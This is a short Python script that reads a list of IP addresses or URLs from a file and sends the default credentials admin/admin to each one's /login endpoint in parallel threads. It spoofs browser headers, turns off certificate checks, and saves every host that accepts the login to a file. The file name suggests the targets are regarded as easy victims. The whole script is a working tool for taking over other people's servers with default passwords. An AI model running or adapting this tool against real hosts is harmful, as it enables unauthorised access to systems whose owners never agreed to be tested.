import requests,json
from threading import Thread
ip_list = []
url_list = []
with open("节点冤种.txt","r") as f:
    for ip in f :
       ip_list.append(ip)
def req(url):
    url = url.strip() +'/login'
    # proxy = {
    #     'http':"http://127.0.0.1:8080",
    #     'https':"http://127.0.0.1:8080"
    # }
    headers = {
        'Sec-Ch-Ua': '"Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Origin': f'{url}',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': f'{url}',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Connection': 'close'
    }
    data = {'username': 'admin','password' : 'admin'}
    resp = requests.post(url=url,  headers=headers,  data=data,  verify=False)
    resp = resp.json()
    if resp["msg"] == "用户名或密码错误":
        pass
    else:
        with open("节点.txt","a+") as f:
            f.write(url+"\n")
if __name__ == '__main__':
    t_list=[]
    for i in ip_list:
        t = Thread(target=req,args=(i,))
        t_list.append(t)
    for t in t_list:
        t.start()
    for t in t_list:
        t.join()
    print(url_list)

